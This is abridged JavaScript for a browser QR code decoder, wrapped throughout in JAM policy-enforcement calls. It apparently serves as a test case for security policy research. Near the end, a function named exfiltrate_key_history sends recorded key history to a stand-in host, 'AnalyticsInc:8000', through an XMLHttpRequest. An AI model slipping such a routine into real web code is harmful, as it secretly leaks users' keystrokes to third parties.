    var errorMagnitudes = JAM.call(this.findErrorMagnitudes, this, [omega, errorLocations, dataMatrix], JAM.policy.p41);
    i$$32 = 0;
    ...
    for (;v690;) {
      ...
      var position = v685 - JAM.call(v1583.log, v1583, [v1584], JAM.policy.p40);
      if (position < 0) {
      ...
      var v2862 = JAM.call(GF256.addOrSubtract, GF256, [v1585, v1586], JAM.policy.p41);
      introspect(JAM.policy.p13) {
        v688[v689] = v2862;
      }
      i$$32 = i$$32 + 1;
...
function GF256Poly(field$$1, coefficients) {
  function v77(other$$8) {
    ...
    var remainder = this;
    var denominatorLeadingTerm$$1 = JAM.call(other$$8.getCoefficient, other$$8, [other$$8.Degree], JAM.policy.p40);
    var v695 = this.field;
    var inverseDenominatorLeadingTerm = JAM.call(v695.inverse, v695, [denominatorLeadingTerm$$1], JAM.policy.p40);
    ...
    for (;v701;) {
      ...
      var v698 = this.field;
      var scale$$2 = JAM.call(v698.multiply, v698, [JAM.call(remainder.getCoefficient, remainder, [remainder.Degree], JAM.policy.p40), inverseDenominatorLeadingTerm], JAM.policy.p41);
      var term = JAM.call(other$$8.multiplyByMonomial, other$$8, [degreeDifference, scale$$2], JAM.policy.p41);
      var v700 = this.field;
      var iterationQuotient = JAM.call(v700.buildMonomial, v700, [degreeDifference, scale$$2], JAM.policy.p41);
      quotient = JAM.call(quotient.addOrSubtract, quotient, [iterationQuotient], JAM.policy.p40);
      remainder = JAM.call(remainder.addOrSubtract, remainder, [term], JAM.policy.p40);
  ...
  function v76(degree$$1, coefficient) {
    ...
    for (;v710;) {
      ...
      var v2863 = JAM.call(v1595.multiply, v1595, [v1596, coefficient], JAM.policy.p41);
      introspect(JAM.policy.p13) {
        v708[v709] = v2863;
      }
      i$$40 = i$$40 + 1;
  ...
  function v75(scalar) {
    ...
    for (;v718;) {
      ...
      var v2864 = JAM.call(v1597.multiply, v1597, [v1598, scalar], JAM.policy.p41);
      introspect(JAM.policy.p13) {
        v716[v717] = v2864;
      }
      i$$39 = i$$39 + 1;
  ...
  function v74(other$$7) {
    ...
    for (;v727;) {
      ...
      for (;v726;) {
        ...
        var v2865 = JAM.call(GF256.addOrSubtract, GF256, [v1603, JAM.call(v2346.multiply, v2346, [aCoeff, v2347], JAM.policy.p41)], JAM.policy.p41);
        introspect(JAM.policy.p13) {
          v724[v725] = v2865;
        }
        j$$22 = j$$22 + 1;
  ...
  function v73(other$$6) {
    ...
    for (;v739;) {
      ...
      var v2866 = JAM.call(GF256.addOrSubtract, GF256, [v1610, v1611], JAM.policy.p41);
      introspect(JAM.policy.p13) {
        v737[v738] = v2866;
      }
      i$$37 = i$$37 + 1;
  ...
  function v72(a$$2) {
    if (a$$2 === 0) {
      return JAM.call(this.getCoefficient, this, [0], JAM.policy.p23);
    }
    ...
    if (a$$2 === 1) {
      ...
      for (;v743;) {
        ...
        result$$5 = JAM.call(GF256.addOrSubtract, GF256, [result$$5, v742], JAM.policy.p41);
        i$$36 = i$$36 + 1;
        v743 = i$$36 < size$$4;
      }
      return result$$5;
    ...
    for (;v748;) {
      ...
      var v746 = JAM.call(v1614.multiply, v1614, [a$$2, result2], JAM.policy.p41);
      var v1615 = this.coefficients;
      introspect(JAM.policy.p27) {
        var v747 = v1615[i$$36]
      }
      result2 = JAM.call(GF256.addOrSubtract, GF256, [v746, v747], JAM.policy.p41);
      i$$36 = i$$36 + 1;
      v748 = i$$36 < size$$4;
    }
    return result2;
  ...
  if (v1620) {
    ...
    if (firstNonZero === coefficientsLength) {
      ...
      var v2867 = new Array(coefficientsLength - firstNonZero);
...
function GF256(primitive) {
  ...
  var v2868 = new Array(256);
  this.expTable = v2868;
  var v2869 = new Array(256);
  this.logTable = v2869;
  var x$$57 = 1;
  var i$$41 = 0;
  var v780 = i$$41 < 256;
  ...
  for (;v783;) {
    ...
    JAM.set(v781, v782, i$$41, JAM.policy.p13);
    i$$41 = i$$41 + 1;
    v783 = i$$41 < 255;
  }
  var at0 = new Array(1);
  at0[0] = 0;
  var v2870 = new GF256Poly(this, new Array(at0));
  this.zero = v2870;
  var at1 = new Array(1);
  at1[0] = 1;
  var v2871 = new GF256Poly(this, new Array(at1));
  this.one = v2871;
...
function FinderPattern(posX, posY, estimatedModuleSize) {
  function v90(moduleSize$$2, i$$47, j$$25) {
    var v1635 = JAM.call(Math.abs, Math, [i$$47 - this.y], JAM.policy.p40) <= moduleSize$$2;
    if (v1635) {
      v1635 = JAM.call(Math.abs, Math, [j$$25 - this.x], JAM.policy.p40) <= moduleSize$$2;
    }
    if (v1635) {
      var moduleSizeDiff = JAM.call(Math.abs, Math, [moduleSize$$2 - this.estimatedModuleSize], JAM.policy.p40);
...
function FinderPatternFinder() {
  function v105(image$$10) {
    ...
    var iSkip = JAM.call(Math.floor, Math, [3 * maxI$$1 / (4 * MAX_MODULES)], JAM.policy.p40);
    ...
    for (;v805;) {
      ...
      for (;v802;) {
        ...
        if (v801) {
          ...
          if ((currentState & 1) === 0) {
            if (currentState === 4) {
              if (JAM.call(this.foundPatternCross, this, [stateCount$$5], JAM.policy.p40)) {
                var confirmed = JAM.call(this.handlePossibleCenter, this, [stateCount$$5, i$$54, j$$28], JAM.policy.p41);
                if (confirmed) {
                  iSkip = 2;
                  if (this.hasSkipped) {
      ...
      if (JAM.call(this.foundPatternCross, this, [stateCount$$5], JAM.policy.p40)) {
        confirmed = JAM.call(this.handlePossibleCenter, this, [stateCount$$5, i$$54, maxJ$$1], JAM.policy.p41);
        if (confirmed) {
    ...
    JAM.call(qrcode.orderBestPatterns, qrcode, [patternInfo], JAM.policy.p40);
  ...
  function v104() {
    ...
    for (;v812;) {
      ...
      totalDeviation = totalDeviation + JAM.call(Math.abs, Math, [pattern$$3.EstimatedModuleSize - average$$1], JAM.policy.p40);
      i$$53 = i$$53 + 1;
      v812 = i$$53 < max$$7;
    }
    ...
    for (;v820;) {
      ...
      if (center$$1.Count >= CENTER_QUORUM) {
        if (firstConfirmedCenter === null) {
          ...
          return JAM.call(Math.floor, Math, [(JAM.call(Math.abs, Math, [firstConfirmedCenter.X - center$$1.X], JAM.policy.p40) - JAM.call(Math.abs, Math, [firstConfirmedCenter.Y - center$$1.Y], JAM.policy.p40)) / 2], JAM.policy.p40);
        }
      }
      i$$52 = i$$52 + 1;
      v820 = i$$52 < max$$6;
  ...
  function v102() {
    ...
    function v100(center1, center2) {
      var dA = JAM.call(Math.abs, Math, [center2.EstimatedModuleSize - average], JAM.policy.p40);
      var dB = JAM.call(Math.abs, Math, [center1.EstimatedModuleSize - average], JAM.policy.p40);
      if (dA < dB) {
        return-1;
      } else {
        if (dA === dB) {
    ...
    if (startSize > 3) {
      ...
      JAM.call(v831.sort, v831, [v100], JAM.policy.p40);
      var stdDev = JAM.call(Math.sqrt, Math, [square / startSize - average * average], JAM.policy.p40);
      var limit = JAM.call(Math.max, Math, [.2 * average, stdDev], JAM.policy.p41);
      i$$51 = 0;
      ...
      for (;v837;) {
        ...
        if (JAM.call(Math.abs, Math, [pattern$$2.EstimatedModuleSize - average], JAM.policy.p40) > limit) {
          var v835 = this.possibleCenters;
          JAM.call(v835.remove, v835, [i$$51], JAM.policy.p31);
          i$$51 = i$$51 - 1;
        }
        i$$51 = i$$51 + 1;
    ...
    if (this.possibleCenters.length > 3) {
      ...
      JAM.call(v839.sort, v839, [v101], JAM.policy.p40);
    }
  ...
  function v99(stateCount$$4, i$$50, j$$27) {
    ...
    var centerJ$$1 = JAM.call(this.centerFromEnd, this, [stateCount$$4, j$$27], JAM.policy.p41);
    var centerI$$1 = JAM.call(this.crossCheckVertical, this, [i$$50, JAM.call(Math.floor, Math, [centerJ$$1], JAM.policy.p40), stateCount$$4[2], stateCountTotal$$2], JAM.policy.p41);
    if (!isNaN(centerI$$1)) {
      centerJ$$1 = JAM.call(this.crossCheckHorizontal, this, [JAM.call(Math.floor, Math, [centerJ$$1], JAM.policy.p40), JAM.call(Math.floor, Math, [centerI$$1], JAM.policy.p40), stateCount$$4[2], stateCountTotal$$2], JAM.policy.p29);
      if (!isNaN(centerJ$$1)) {
        ...
        for (;v854;) {
          ...
          if (JAM.call(center.aboutEquals, center, [estimatedModuleSize$$1, centerI$$1, centerJ$$1], JAM.policy.p41)) {
        ...
        if (!found) {
          ...
          JAM.call(v855.push, v855, [point$$2], JAM.policy.p40);
          if (this.resultPointCallback !== null) {
            var v856 = this.resultPointCallback;
            JAM.call(v856.foundPossibleResultPoint, v856, [point$$2], JAM.policy.p40);
          }
        }
        return true;
      }
  ...
  function v98(startJ, centerI, maxCount$$1, originalStateCountTotal$$1) {
    ...
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal$$1 - originalStateCountTotal$$1], JAM.policy.p40) >= originalStateCountTotal$$1) {
      return NaN;
    }
    var v876;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$3], JAM.policy.p40)) {
      v876 = JAM.call(this.centerFromEnd, this, [stateCount$$3, j$$26], JAM.policy.p41);
    } else {
      v876 = NaN;
    }
    return v876;
  ...
  function v97(startI, centerJ, maxCount, originalStateCountTotal) {
    ...
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal - originalStateCountTotal], JAM.policy.p40) >= 2 * originalStateCountTotal) {
      return NaN;
    }
    var v892;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$2], JAM.policy.p40)) {
      v892 = JAM.call(this.centerFromEnd, this, [stateCount$$2, i$$49], JAM.policy.p41);
    } else {
      v892 = NaN;
    }
    return v892;
  ...
  function v95(stateCount) {
    ...
    var moduleSize$$3 = JAM.call(Math.floor, Math, [(totalModuleSize << INTEGER_MATH_SHIFT) / 7], JAM.policy.p40);
    var maxVariance = JAM.call(Math.floor, Math, [moduleSize$$3 / 2], JAM.policy.p40);
    var v2642 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[0] << INTEGER_MATH_SHIFT)], JAM.policy.p40) < maxVariance;
    if (v2642) {
      v2642 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[1] << INTEGER_MATH_SHIFT)], JAM.policy.p40) < maxVariance;
    }
    var v2438 = v2642;
    if (v2438) {
      v2438 = JAM.call(Math.abs, Math, [3 * moduleSize$$3 - (stateCount[2] << INTEGER_MATH_SHIFT)], JAM.policy.p40) < 3 * maxVariance;
    }
    var v1740 = v2438;
    if (v1740) {
      v1740 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[3] << INTEGER_MATH_SHIFT)], JAM.policy.p40) < maxVariance;
    }
    var v900 = v1740;
    if (v900) {
      v900 = JAM.call(Math.abs, Math, [moduleSize$$3 - (stateCount[4] << INTEGER_MATH_SHIFT)], JAM.policy.p40) < maxVariance;
    }
    return v900;
  }
  function v94() {
...
function AlignmentPattern(posX$$1, posY$$1, estimatedModuleSize$$2) {
  function v111(moduleSize$$4, i$$55, j$$29) {
    var v1742 = JAM.call(Math.abs, Math, [i$$55 - this.y], JAM.policy.p40) <= moduleSize$$4;
    if (v1742) {
      v1742 = JAM.call(Math.abs, Math, [j$$29 - this.x], JAM.policy.p40) <= moduleSize$$4;
    }
    if (v1742) {
      var moduleSizeDiff$$1 = JAM.call(Math.abs, Math, [moduleSize$$4 - this.estimatedModuleSize], JAM.policy.p40);
  ...
  function v109() {
    return JAM.call(Math.floor, Math, [this.y], JAM.policy.p40);
  }
  function v108() {
    return JAM.call(Math.floor, Math, [this.x], JAM.policy.p40);
  }
  function v107() {
    return this.count;
  }
  ...
  JAM.call(this.__defineGetter__, this, ["EstimatedModuleSize", v106], JAM.policy.p22);
  JAM.call(this.__defineGetter__, this, ["Count", v107], JAM.policy.p22);
  JAM.call(this.__defineGetter__, this, ["X", v108], JAM.policy.p22);
  JAM.call(this.__defineGetter__, this, ["Y", v109], JAM.policy.p22);
...
function AlignmentPatternFinder(image$$11, startX, startY, width$$12, height$$11, moduleSize$$5, resultPointCallback) {
  function v116() {
    ...
    for (;v923;) {
      ...
      for (;v920;) {
        ...
        if (v919) {
          if (currentState$$1 === 1) {
            ...
            if (currentState$$1 === 2) {
              if (JAM.call(this.foundPatternCross, this, [stateCount$$10], JAM.policy.p40)) {
                var confirmed$$1 = JAM.call(this.handlePossibleCenter, this, [stateCount$$10, i$$59, j$$31], JAM.policy.p41);
                if (confirmed$$1 !== null) {
                  return confirmed$$1;
                }
              }
      ...
      if (JAM.call(this.foundPatternCross, this, [stateCount$$10], JAM.policy.p40)) {
        confirmed$$1 = JAM.call(this.handlePossibleCenter, this, [stateCount$$10, i$$59, maxJ$$2], JAM.policy.p41);
        if (confirmed$$1 !== null) {
          return confirmed$$1;
        }
      }
  ...
  function v115(stateCount$$9, i$$58, j$$30) {
    ...
    var centerJ$$3 = JAM.call(this.centerFromEnd, this, [stateCount$$9, j$$30], JAM.policy.p41);
    var centerI$$2 = JAM.call(this.crossCheckVertical, this, [i$$58, JAM.call(Math.floor, Math, [centerJ$$3], JAM.policy.p40), 2 * stateCount$$9[1], stateCountTotal$$4], JAM.policy.p41);
    if (!isNaN(centerI$$2)) {
      ...
      for (;v934;) {
        ...
        if (JAM.call(center$$2.aboutEquals, center$$2, [estimatedModuleSize$$3, centerI$$2, centerJ$$3], JAM.policy.p41)) {
      ...
      JAM.call(v935.push, v935, [point$$3], JAM.policy.p40);
      if (this.resultPointCallback !== null) {
        var v936 = this.resultPointCallback;
        JAM.call(v936.foundPossibleResultPoint, v936, [point$$3], JAM.policy.p40);
      }
    }
    return null;
  }
  function v114(startI$$1, centerJ$$2, maxCount$$2, originalStateCountTotal$$2) {
    ...
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal$$3 - originalStateCountTotal$$2], JAM.policy.p40) >= 2 * originalStateCountTotal$$2) {
      return NaN;
    }
    var v950;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$8], JAM.policy.p40)) {
      v950 = JAM.call(this.centerFromEnd, this, [stateCount$$8, i$$57], JAM.policy.p41);
    } else {
      v950 = NaN;
    }
    return v950;
  ...
  function v113(stateCount$$7) {
    ...
    for (;v952;) {
      ...
      if (JAM.call(Math.abs, Math, [moduleSize$$6 - v2665], JAM.policy.p40) >= maxVariance$$1) {
        return false;
      }
      i$$56 = i$$56 + 1;
      v952 = i$$56 < 3;
...
function QRCodeDataBlockReader(blocks, version$$8, numErrorCorrectionCode) {
  function v124() {
    ...
    do {
      ...
      dataLength = JAM.call(this.getDataLength, this, [mode$$7], JAM.policy.p40);
      if (dataLength < 1) {
        throw "Invalid data length: " + dataLength;
      }
      switch(mode$$7) {
        case MODE_NUMBER:
          var temp_str = JAM.call(this.getFigureString, this, [dataLength], JAM.policy.p40);
          var ta = new Array(temp_str.length);
          var j$$32 = 0;
          var v963 = j$$32 < temp_str.length;
          for (;v963;) {
            var v961 = ta;
            var v962 = j$$32;
            var v2875 = JAM.call(temp_str.charCodeAt, temp_str, [j$$32], JAM.policy.p40);
            introspect(JAM.policy.p13) {
              v961[v962] = v2875;
            }
            j$$32 = j$$32 + 1;
            v963 = j$$32 < temp_str.length;
          }
          JAM.call(output$$1.push, output$$1, [ta], JAM.policy.p40);
          break;
        case MODE_ROMAN_AND_NUMBER:
          temp_str = JAM.call(this.getRomanAndFigureString, this, [dataLength], JAM.policy.p40);
          ta = new Array(temp_str.length);
          j$$32 = 0;
          var v967 = j$$32 < temp_str.length;
          for (;v967;) {
            var v965 = ta;
            var v966 = j$$32;
            var v2876 = JAM.call(temp_str.charCodeAt, temp_str, [j$$32], JAM.policy.p40);
            introspect(JAM.policy.p13) {
              v965[v966] = v2876;
            }
            j$$32 = j$$32 + 1;
            v967 = j$$32 < temp_str.length;
          }
          JAM.call(output$$1.push, output$$1, [ta], JAM.policy.p40);
          break;
        case MODE_8BIT_BYTE:
          var temp_sbyteArray3 = JAM.call(this.get8bitByteArray, this, [dataLength], JAM.policy.p40);
          JAM.call(output$$1.push, output$$1, [temp_sbyteArray3], JAM.policy.p40);
          break;
        case MODE_KANJI:
          temp_str = JAM.call(this.getKanjiString, this, [dataLength], JAM.policy.p40);
          JAM.call(output$$1.push, output$$1, [temp_str], JAM.policy.p40);
      }
    } while (true);
    return output$$1;
  }
  function v123(dataLength$$4) {
    ...
    do {
      intData$$3 = JAM.call(getNextBits, null, [13], JAM.policy.p23);
      ...
      unicodeString = unicodeString + JAM.call(String.fromCharCode, String, [shiftjisWord], JAM.policy.p40);
  ...
  function v122(dataLength$$3) {
    ...
    do {
      intData$$2 = JAM.call(this.getNextBits, this, [8], JAM.policy.p23);
      JAM.call(output.push, output, [intData$$2], JAM.policy.p40);
  ...
  function v121(dataLength$$2) {
    ...
    do {
      if (length$$12 >= 3) {
        intData$$1 = JAM.call(this.getNextBits, this, [10], JAM.policy.p23);
        if (intData$$1 < 100) {
        ...
        if (length$$12 === 2) {
          intData$$1 = JAM.call(this.getNextBits, this, [7], JAM.policy.p23);
          if (intData$$1 < 10) {
            strData$$1 = strData$$1 + "0";
          }
          ...
          if (length$$12 === 1) {
            intData$$1 = JAM.call(this.getNextBits, this, [4], JAM.policy.p23);
  ...
  function v120(dataLength$$1) {
    ...
    do {
      if (length$$11 > 1) {
        intData = JAM.call(this.getNextBits, this, [11], JAM.policy.p23);
        var firstLetter = JAM.call(Math.floor, Math, [intData / 45], JAM.policy.p40);
  ...
  function v119(modeIndicator) {
    ...
    return JAM.call(this.getNextBits, this, [v984], JAM.policy.p40);
  }
  function v118() {
    if (this.blockPointer > this.blocks.length - this.numErrorCorrectionCode - 2) {
      return 0;
    } else {
      return JAM.call(this.getNextBits, this, [4], JAM.policy.p23);
    }
    return;
  }
  ...
  JAM.call(this.__defineGetter__, this, ["DataByte", v124], JAM.policy.p22);
  return;
}
function exfiltrate_key_history(key_history) {
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?" + key_history, true], JAM.policy.p22);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p23);
  return;
}
function read(a$$9) {
  JAM.call(document.getElementById, document, ["mid"], JAM.policy.p25).value = a$$9;
  return;
}
function load() {
...
function processImage() {
  var qrpath = JAM.call(document.getElementById, document, ["imgpath"], JAM.policy.p25).innerHTML;
  JAM.call(qrcode.decode, qrcode, [qrpath], JAM.policy.p40);
  return;
}
GridSampler = {};
...
var v1018 = Version;
var v2877 = new Array(31892, 34236, 39577, 42195, 48118, 51042, 55367, 58893, 63784, 68472, 70749, 76311, 79154, 84390, 87683, 92361, 96236, 102084, 102881, 110507, 110734, 117786, 119615, 126325, 127568, 133589, 136944, 141498, 145311, 150283, 152622, 158308, 161089, 167017);
v1018.VERSION_DECODE_INFO = v2877;
var v1019 = Version;
var v2878 = buildVersions();
...
var v1052 = DataMask;
var v2879 = new Array(new DataMask000, new DataMask001, new DataMask010, new DataMask011, new DataMask100, new DataMask101, new DataMask110, new DataMask111);
v1052.DATA_MASKS = v2879;
var v1053 = GF256;
var v2880 = new GF256(285);
v1053.QR_CODE_FIELD = v2880;
var v1054 = GF256;
var v2881 = new GF256(301);
v1054.DATA_MATRIX_FIELD = v2881;
GF256.addOrSubtract = v140;
Decoder = {};
var v1055 = Decoder;
var v2882 = new ReedSolomonDecoder(GF256.QR_CODE_FIELD);
...
JAM.set(JAM.call(document.getElementById, document, ["decode"], JAM.policy.p25), "onclick", processImage);
load()
